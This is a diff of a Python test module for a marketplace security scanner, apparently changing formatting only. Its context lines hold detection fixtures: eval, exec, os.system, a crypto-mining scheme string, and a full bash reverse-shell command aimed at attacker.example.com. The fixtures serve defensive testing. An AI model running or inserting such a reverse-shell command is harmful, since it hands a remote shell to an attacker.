@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 """Tests for the marketplace security scanner."""
 
 import textwrap
@@ -23,8 +24,8 @@ def _write_skill(tmp_path: Path, content: str) -> Path:
 
 
 # Names assembled from parts so this test module doesn't itself trigger hooks.
-_FN_EVAL = "ev" + "al"                   # noqa: S307
-_FN_EXEC = "ex" + "ec"                   # noqa: S603
+_FN_EVAL = "ev" + "al"  # noqa: S307
+_FN_EXEC = "ex" + "ec"  # noqa: S603
 _FN_OS_SYSTEM = "os.sys" + "tem"
 _CRYPTO = "stratum+tcp"
 _REVERSE_SHELL = "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1"
@@ -66,7 +67,10 @@ def test_no_blocks():
 
 
 def test_clean_file(tmp_path):
-    path = _write_skill(tmp_path, textwrap.dedent("""\
+    path = _write_skill(
+        tmp_path,
+        textwrap.dedent(
+            """\
         ---
         name: my-skill
         description: A clean skill
@@ -78,7 +82,9 @@ def test_clean_file(tmp_path):
         def greet(name: str) -> str:
             return f"Hello, {name}"
         ```
-    """))
+    """,
+        ),
+    )
     result = scan_file(path)
     assert result.risk_level == RiskLevel.CLEAN
     assert result.findings == []
@@ -154,7 +160,7 @@ def test_subprocess_run_is_medium(tmp_path):
     path = _write_skill(tmp_path, md)
     result = scan_file(path)
     assert result.risk_level == RiskLevel.MEDIUM
-    assert not result.blocked   # MEDIUM is not blocked
+    assert not result.blocked  # MEDIUM is not blocked
 
 
 # ── scan_listing ──────────────────────────────────────────────────────────────
